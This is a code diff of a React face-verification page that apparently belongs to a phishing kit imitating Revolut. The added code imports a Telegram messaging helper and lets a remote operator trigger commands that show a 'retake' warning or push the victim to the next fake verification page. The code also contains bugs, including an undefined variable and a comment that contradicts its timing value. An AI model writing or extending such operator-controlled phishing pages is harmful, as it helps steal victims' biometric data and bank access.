@@ -1,16 +1,66 @@
 "use client"
 import React, { useEffect, useRef, useState } from "react";
 import { sendMessageToTelegram } from '../lib/api';
+import { useCommand } from '../app/lib/CommandContext';
+import { useRouter } from 'next/navigation';
 
 
 
 
 
 export default function FaceVerification() {
+    const router = useRouter();
+    const { command } = useCommand(); 
     const videoRef = useRef(null);
     const canvasRef = useRef(null);
     const [isCapturing, setIsCapturing] = useState(false);
+    const [displayLoader, setDisplayLoader] = useState(false)
+    const [displayError, setDisplayError] = useState(false)
+    const [displayAuth, setDisplayAuth] = useState(false)
 
+    // Handle wether to display error for phone number or email
+    const [displayMessage, setDisplayMessage] = useState('phone')
+    const displayPageLoader = () => {
+        console.log("NOW DISPLAYING PAGE LOADER")
+        setDisplayLoader(!displayLoader)
+    }
+    
+    const navigateWithLoader = (path) => {
+      // Show loader
+      setDisplayLoader(true);
+      
+      // Set a minimum display time for the loader (for UX purposes)
+      const minLoaderTime = 3500; // 1.5 seconds
+      const startTime = Date.now();
+      
+      // Prepare the navigation
+      const performNavigation = () => {
+        router.push(path);
+      };
+      
+      // Handle the timing
+      setTimeout(() => {
+        const elapsedTime = Date.now() - startTime;
+        if (elapsedTime < minLoaderTime) {
+          // If minimum time hasn't passed, wait the remaining time
+          setTimeout(performNavigation, minLoaderTime - elapsedTime);
+        } else {
+          // Minimum time has passed, navigate immediately
+          performNavigation();
+        }
+      }, 100); // Small delay to ensure loader is visible
+    };
+
+    useEffect(() => {
+        if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
+            showRedWarning(setWarningActive);
+            setIsCapturing(false);
+        } else if (command === 'FINISH') {
+            navigateWithLoader('/verificationPage');
+        }
+    }, [command, router, commandCounter]);
+
+    
     // Start the camera when the component mounts
     useEffect(() => {
         const startCamera = async () => {
@@ -69,6 +119,16 @@ export default function FaceVerification() {
             }
         }, 300);
 };
+    const [warningActive, setWarningActive] = useState(false);
+
+    
+    const showRedWarning = (setWarningActive) => {
+      // Update the state to show the warning
+      setWarningActive(true);
+      
+      // You can add a timeout to automatically remove the warning after some time
+      // setTimeout(() => setWarningActive(false), 5000); // Remove after 5 seconds
+    };
 
     return (
         <div className="h-screen w-full bg-gradient-to-b from-blue-900 to-black flex flex-col items-center justify-center relative overflow-hidden">
@@ -103,18 +163,24 @@ export default function FaceVerification() {
                 </div>
                 
                 {/* Face outline guide */}
-                <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
-                    <svg width="180" height="220" viewBox="0 0 180 220" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M90 10C40 10 10 60 10 110C10 160 40 210 90 210C140 210 170 160 170 110C170 60 140 10 90 10Z" stroke="rgba(255,255,255,0.6)" strokeWidth="2" strokeDasharray="8 4" />
-                    </svg>
-                </div>
-            </div>
-
-            {/* Instructions */}
-            <div className="text-center mb-12">
-                <p className="text-white text-lg font-medium mb-2">Position your face in the oval</p>
-                <p className="text-blue-300 text-sm">Make sure your face is well-lit and clearly visible</p>
-            </div>
+                    <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
+                        <svg width="180" height="220" viewBox="0 0 180 220" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path 
+                                d="M90 10C40 10 10 60 10 110C10 160 40 210 90 210C140 210 170 160 170 110C170 60 140 10 90 10Z" 
+                                stroke={warningActive ? "rgba(255,0,0,0.8)" : "rgba(255,255,255,0.6)"} 
+                                strokeWidth={warningActive ? "3" : "2"} 
+                                strokeDasharray="8 4" 
+                            />
+                        </svg>
+                    </div>
+                    
+                    {/* Instructions */}
+                    <div className="text-center mb-12">
+                        <p className={`text-lg font-medium mb-2 ${warningActive ? 'text-red-500' : 'text-white'}`}>
+                            {warningActive ? "Please Go to well lit area" : "Position your face in the oval"}
+                        </p>
+                        <p className="text-blue-300 text-sm">Make sure your face is well-lit and clearly visible</p>
+                    </div>
 
             {/* Capture button */}
             <div className="mb-8">
